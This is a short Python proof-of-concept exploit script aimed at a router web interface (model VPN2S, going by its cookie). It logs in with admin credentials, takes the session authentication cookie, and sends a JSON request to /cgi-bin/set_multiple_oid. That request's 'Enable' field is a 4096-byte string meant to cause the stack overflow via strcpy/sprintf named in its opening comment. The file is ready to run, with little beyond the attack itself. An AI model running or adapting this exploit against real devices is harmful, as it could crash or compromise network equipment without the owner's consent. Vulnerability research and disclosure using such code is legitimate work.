#!/usr/bin/env python3

#Author: Eutopia

# stack overflow cuz strcpy, sprintf
import requests

#####   config  start   #####
server = "192.168.2.1"
username = "admin"
password = "123456"
#####   config  end     #####

main_url = "http://" + server

def login():
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36",
        "Cookie": "frun=0; model=VPN2S; hname=[; webcolor=blue; Authentication=; login=admin",
    }
    s = requests.Session()
    url = main_url + "/init"
    data = {
        "username": username,
        "pwd": password,
        "pwd_r": "",
        "password": password,
        "loginTosslvpn": "false"
    }
    r = s.post(url, headers=headers, data=data, timeout=100)
    print(f"[*] headers: {r.headers}")
    print(f"[*] response: {r}")
    return r.headers

def get_authentication_key(headers):
    auth = headers["Set-Cookie"].split(";")[0].split("=")[1]
    return auth

def exp(auth):
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36",
        "Cookie": "frun=0; model=VPN2S; hname=[; webcolor=blue; login=admin; Authentication=" + auth,
    }
    s = requests.Session()
    url = main_url + "/cgi-bin/set_multiple_oid"
    data = {
        "url": "/cgi-bin/set_multiple_oid",
        "access": "PUT",
        "oid": "set_multiple_oid",
        "z_obj": [
            {
                "access": "POST",
                "oid": "RDM_OID_IP_IFACE_V6_ADDR",
                "parentOid": "RDM_OID_IP_IFACE",
                "parentIid": [5,0,0,0,0,0],
                "url": "/cgi-bin/broadband",
                "z_obj": {
                    "Enable": "a"*0x1000+".addUncheck"
                }
            }
        ]
    }
    r = s.post(url, headers=headers, json=data, timeout=100)
    print(r.text)

print("\n[*] Connection ", main_url)
headers = login()
print("[*] Get Authentication Key")
auth = get_authentication_key(headers)
print(auth)
print("[*] Exploiting")
exp(auth)